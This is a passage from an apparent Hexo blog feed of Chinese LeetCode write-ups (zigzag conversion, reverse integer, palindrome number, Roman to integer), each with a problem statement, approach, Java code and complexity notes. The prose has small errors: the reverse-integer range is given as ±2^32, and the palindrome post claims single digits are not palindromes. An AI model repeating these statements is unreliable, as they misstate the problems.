这里要小心，跳出while循环时，恰好满足 s.charAt(i) != s.charAt(j),因此不能取 i ,不能取 j</span><br>        <span class="hljs-keyword">return</span> s.substring(i + <span class="hljs-number">1</span>, j);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N²)</b></font><font size="4" face="Open Sans">，枚举”中心位置”时间复杂度为O(N),从”中心位置”扩散得到”回文子串”的时间复杂度为O(N),因此时间复杂度可以降到O(N²)。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(1)</b></font><font size="4" face="Open Sans">，只使用到了常数个临时变量，与字符串长度无关。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-06-ZigZagConversion</title>
    <url>/article/803c290c.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">The string “PAYPALISHIRING” is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)</font></p>
<a id="more"></a>

<figure class="highlight tp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tp"><span class="hljs-keyword">P</span>   A   H   N<br>A <span class="hljs-keyword">P</span> L S I I G<br><span class="hljs-keyword">Y</span>   I   <span class="hljs-keyword">R</span><br></code></pre></div></td></tr></table></figure>
<p><font color="#856363" size="4" face="Open Sans">And then read line by line: “PAHNAPLSIIGYIR”</font></p>
<hr>
<font size="4" face="Open Sans"><b>Example1</b></font>

<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">Input:</span> s = <span class="hljs-string">"PAYPALISHIRING"</span>, numRows = <span class="hljs-number">3</span><br><span class="hljs-symbol">Output:</span> <span class="hljs-string">"PAHNAPLSIIGYIR"</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example2</b></font></p>
<figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">Input</span>: <span class="hljs-string">s = "PAYPALISHIRING", numRows = 4</span><br><span class="hljs-attr">Output</span>: <span class="hljs-string">"PINALSIGYAHRPI"</span><br><span class="hljs-attr">Explanation</span>:<span class="hljs-string"></span><br><span class="hljs-attr">P</span>     <span class="hljs-string">I    N</span><br><span class="hljs-attr">A</span>   <span class="hljs-string">L S  I G</span><br><span class="hljs-attr">Y</span> <span class="hljs-string">A   H R</span><br><span class="hljs-attr">P</span>     <span class="hljs-string">I</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example3</b></font></p>
<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">Input:</span> s = <span class="hljs-string">"A"</span>, numRows = <span class="hljs-number">1</span><br><span class="hljs-symbol">Output:</span> <span class="hljs-string">"A"</span><br></code></pre></div></td></tr></table></figure>

<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。<br>比如输入字符串为 <code>&quot;LEETCODEISHIRING&quot;</code> 行数为 3 时，排列如下：</font></p>
<figure class="highlight tp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tp"><span class="hljs-keyword">P</span>   A   H   N<br>A <span class="hljs-keyword">P</span> L S I I G<br><span class="hljs-keyword">Y</span>   I   <span class="hljs-keyword">R</span><br></code></pre></div></td></tr></table></figure>
<p><font size="4" face="Open Sans">之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：”LCIRETOESIIGEDHN”。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><font size="4" face="Open Sans">这题可以先将不同的行的字母存储在一组中，再将不同组整合到一个字符串中。难度不大，但不一定能想到。</font></p>
<p><font size="4" face="Open Sans"><b>算法流程</b>:按顺序白能力字符串<code>s</code>;<br>&nbsp;&nbsp;&nbsp;&nbsp;1. res[i] += c : 把每个字符 <code>c</code> 填入对应行si;<br>&nbsp;&nbsp;&nbsp;&nbsp;2. i += flag : 更新当前字符 <code>c</code> 对应的行索引;<br>&nbsp;&nbsp;&nbsp;&nbsp;3. flag = -flag</font></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D06_ZipZagConversion</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">convert</span><span class="hljs-params">(String s, <span class="hljs-keyword">int</span> numRows)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (numRows &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> s;<br>        List&lt;StringBuilder&gt; rows = <span class="hljs-keyword">new</span> ArrayList&lt;StringBuilder&gt;();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; numRows; i++) &#123;<br>            rows.add(<span class="hljs-keyword">new</span> StringBuilder());<br>        &#125;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, flag = -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c : s.toCharArray()) &#123;<br>            rows.get(i).append(c);<br>            <span class="hljs-keyword">if</span> (i==<span class="hljs-number">0</span> || i==numRows - <span class="hljs-number">1</span>) flag = -flag;<br>            i += flag;<br>        &#125;<br>        StringBuilder res = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">for</span> (StringBuilder row : rows) &#123;<br>            res.append(row);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res.toString();<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N)</b></font><font size="4" face="Open Sans">，遍历一遍字符串 <code>s</code> ;</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(N)</b></font><font size="4" face="Open Sans">，各行字符串共占用O(N)额外空间。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-07-ReverseInteger</title>
    <url>/article/ebaca648.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">Given a 32-bit signed integer, reverse digits of an integer.</font></p>
<a id="more"></a>


<hr>
<font size="4" face="Open Sans"><b>Example1</b></font>

<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-number">123</span><br><span class="hljs-attr">Output:</span> <span class="hljs-number">321</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example2</b></font></p>
<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-number">-123</span><br><span class="hljs-attr">Output:</span> <span class="hljs-number">-321</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example3</b></font></p>
<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-number">120</span><br><span class="hljs-attr">Output:</span> <span class="hljs-number">21</span><br></code></pre></div></td></tr></table></figure>

<p><font color="#856363" size="6" face="Open Sans">Note</font><font color="#856363" size="4" face="Open Sans">: Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [−2^31, 2^31 − 1]. For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows.</font></p>
<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">给出一个32位的有符号整数，你需要将这个整数中每一位上的数字进行反转。注意：假设我们的环境只能存储得下32位的有符号整数，则其数值范围为[-2^32, 2^32-1]。请根据这个假设，如果反转后整数溢出那么就返回0。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><font size="4" face="Open Sans">这一题很简单，只是反转所给出的数字，但是要注意，如果反转之后的数字不在[−2^31, 2^31 − 1]范围之中的话，需要返回0。</font></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D07_ReverseInteger</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">reverse</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> tmp = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (x != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> ((tmp * <span class="hljs-number">10</span>) /<span class="hljs-number">10</span> != tmp) &#123;<br>                tmp = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            tmp = tmp * <span class="hljs-number">10</span> + x % <span class="hljs-number">10</span>;<br>            x /= <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> tmp;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(log(N))</b></font><font size="4" face="Open Sans">,x中大约有log10(x)位数字。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(1)</b></font><font size="4" face="Open Sans">。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-09-PalindromeNumber</title>
    <url>/article/f69c6c8d.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">Determine whether an integer is a palindrome. An integer is a palindrome when it reads the same backward as forward.</font></p>
<a id="more"></a>


<hr>
<font size="4" face="Open Sans"><b>Example1</b></font>

<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-number">121</span><br><span class="hljs-attr">Output:</span> <span class="hljs-literal">true</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example1</b></font></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">Input: <span class="hljs-number">-121</span><br>Output: <span class="hljs-literal">false</span><br>Explanation: From left <span class="hljs-built_in">to</span> <span class="hljs-literal">right</span>, <span class="hljs-keyword">it</span> reads <span class="hljs-number">-121.</span> From <span class="hljs-literal">right</span> <span class="hljs-built_in">to</span> left, <span class="hljs-keyword">it</span> becomes<br><span class="hljs-number">121</span>-. Therefore <span class="hljs-keyword">it</span> is <span class="hljs-keyword">not</span> <span class="hljs-keyword">a</span> palindrome.<br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example3</b></font></p>
<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-number">10</span><br><span class="hljs-attr">Output:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">Explanation:</span> <span class="hljs-string">Reads</span> <span class="hljs-number">01</span> <span class="hljs-string">from</span> <span class="hljs-string">right</span> <span class="hljs-string">to</span> <span class="hljs-string">left.</span> <span class="hljs-string">Therefore</span> <span class="hljs-string">it</span> <span class="hljs-string">is</span> <span class="hljs-string">not</span> <span class="hljs-string">a</span> <span class="hljs-string">palindrome.</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Follow up:</b></font></p>
<p><font color="#856363" size="4" face="Open Sans">Coud you solve it without converting the integer to a string?</font></p>
<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">判断一个整数是否是回文数。回文数是指正序(从左向右)和倒序(从右向左)读都是一样的整数。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><font size="4" face="Open Sans">判断一个整数是不是回文数。<br>很简答，要注意负数，个位数，10都不是回文数。其他的整数再按照回文的规则判断。</font></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D09_PalindromeNumber</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> x1 = x;<br>        <span class="hljs-keyword">int</span> tmp = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (x1 &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        <span class="hljs-keyword">while</span> (x != <span class="hljs-number">0</span>) &#123;<br>            tmp = tmp * <span class="hljs-number">10</span> + x % <span class="hljs-number">10</span>;<br>            x /= <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (tmp == x1) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(log(N))</b></font><font size="4" face="Open Sans">,x中大约有log10(x)位数字。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(1)</b></font><font size="4" face="Open Sans">。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-13-RomanToInteger</title>
    <url>/article/a1590bf.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">Roman numerals are represented by seven different symbols: <code>I</code> , <code>V</code> , <code>X</code> , <code>L</code> , <code>C</code> , <code>D</code> and <code>M</code> .</font></p>
<figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">Symbol</span> <span class="hljs-string">Value</span><br><span class="hljs-attr">I</span>  	<span class="hljs-string">1</span><br><span class="hljs-attr">V</span> 	<span class="hljs-string">5</span><br><span class="hljs-attr">X</span> 	<span class="hljs-string">10</span><br><span class="hljs-attr">L</span> 	<span class="hljs-string">50</span><br><span class="hljs-attr">C</span> 	<span class="hljs-string">100</span><br><span class="hljs-attr">D</span> 	<span class="hljs-string">500</span><br><span class="hljs-attr">M</span> 	<span class="hljs-string">1000</span><br></code></pre></div></td></tr></table></figure>



<p><font color="#856363" size="4" face="Open Sans">For example, two is written as <code>II</code> in Roman numeral, just two one’s added together. Twelve is written as, <code>XII</code> , which is simply <code>X</code> + <code>II</code> . The number twenty seven is written as <code>XXVII</code> , which is <code>XX</code> + <code>V</code> + <code>II</code>.</font></p>
<a id="more"></a>

<p><font color="#856363" size="4" face="Open Sans">Roman numerals are usually written largest to smallest from left to right. However, the numeral for four is not <code>IIII</code> . Instead, the number four is written as <code>IV</code> . Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as <code>IX</code> . There are six instances where subtraction is used:<br>&nbsp;&nbsp;&nbsp;&nbsp; ● <code>I</code> can be placed before <code>V</code> (5) and <code>X</code> (10) to make 4 and 9.<br>&nbsp;&nbsp;&nbsp;&nbsp; ● <code>X</code> can be placed before <code>L</code> (50) and <code>C</code> (100) to make 40 and 90.<br>&nbsp;&nbsp;&nbsp;&nbsp; ● <code>C</code> can be placed before <code>D</code> (500) and <code>M</code> (1000) to make 400 and 900.<br>Given a roman numeral, convert it to an integer. Input is guaranteed to be within the range from 1 to 3999.</font></p>
<hr>
<font size="4" face="Open Sans"><b>Example1</b></font>

<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">Input:</span> <span class="hljs-string">"III"</span><br><span class="hljs-symbol">Output:</span> <span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example2</b></font></p>
<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">Input:</span> <span class="hljs-string">"IV"</span><br><span class="hljs-symbol">Output:</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example3</b></font></p>
<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">Input:</span> <span class="hljs-string">"IX"</span><br><span class="hljs-symbol">Output:</span> <span class="hljs-number">9</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example4</b></font></p>
<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">"LVIII"</span><br><span class="hljs-attr">Output:</span> <span class="hljs-number">58</span><br><span class="hljs-attr">Explanation:</span> <span class="hljs-string">L</span> <span class="hljs-string">=</span> <span class="hljs-number">50</span><span class="hljs-string">,</span> <span class="hljs-string">V=</span> <span class="hljs-number">5</span><span class="hljs-string">,</span> <span class="hljs-string">III</span> <span class="hljs-string">=</span> <span class="hljs-number">3</span><span class="hljs-string">.</span><br></code></pre></div></td></tr></table></figure>


<p><font size="4" face="Open Sans"><b>Example5</b></font></p>
<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">"MCMXCIV"</span><br><span class="hljs-attr">Output:</span> <span class="hljs-number">1994</span><br><span class="hljs-attr">Explanation:</span> <span class="hljs-string">M</span> <span class="hljs-string">=</span> <span class="hljs-number">1000</span><span class="hljs-string">,</span> <span class="hljs-string">CM</span> <span class="hljs-string">=</span> <span class="hljs-number">900</span><span class="hljs-string">,</span> <span class="hljs-string">XC</span> <span class="hljs-string">=</span> <span class="hljs-number">90</span> <span class="hljs-string">and</span> <span class="hljs-string">IV</span> <span class="hljs-string">=</span> <span class="hljs-number">4</span><span class="hljs-string">.</span><br></code></pre></div></td></tr></table></figure>

<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。</font></p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">字符          数值<br>I             <span class="hljs-number">1</span><br>V             <span class="hljs-number">5</span><br>X             <span class="hljs-number">10</span><br>L             <span class="hljs-number">50</span><br>C             <span class="hljs-number">100</span><br>D             <span class="hljs-number">500</span><br>M             <span class="hljs-number">1000</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans">例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p>
<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：<br>&nbsp;&nbsp;&nbsp;&nbsp; ● I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。<br>&nbsp;&nbsp;&nbsp;&nbsp; ● X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。<br>&nbsp;&nbsp;&nbsp;&nbsp; ● C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。<br>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><font size="4" face="Open Sans">
    &nbsp;&nbsp;&nbsp;&nbsp; ● 给定一个罗马数字，将其转换成整数。输入确保在1到3999的范围内。<br>
    &nbsp;&nbsp;&nbsp;&nbsp; ● 简单题。按照题目中罗马数字的字符数值，计算出对应罗马数字的十进制数即可。
</font>

<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D13_RomanToInteger</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">romanToInt</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> preNum = getValue(s.charAt(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; s.length(); i++) &#123;<br>            <span class="hljs-keyword">int</span> num = getValue(s.charAt(i));<br>            <span class="hljs-keyword">if</span>(preNum &lt; num) &#123;<br>                sum -= preNum;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                sum += preNum;<br>            &#125;<br>            preNum = num;<br>        &#125;<br>        sum += preNum;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getValue</span><span class="hljs-params">(<span class="hljs-keyword">char</span> ch)</span> </span>&#123;<br>        <span class="hljs-keyword">switch</span>(ch) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'I'</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'V'</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'X'</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'L'</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">50</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'C'</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">100</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'D'</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">500</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">'M'</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">1000</span>;<br>            <span class="hljs-keyword">default</span>: <span 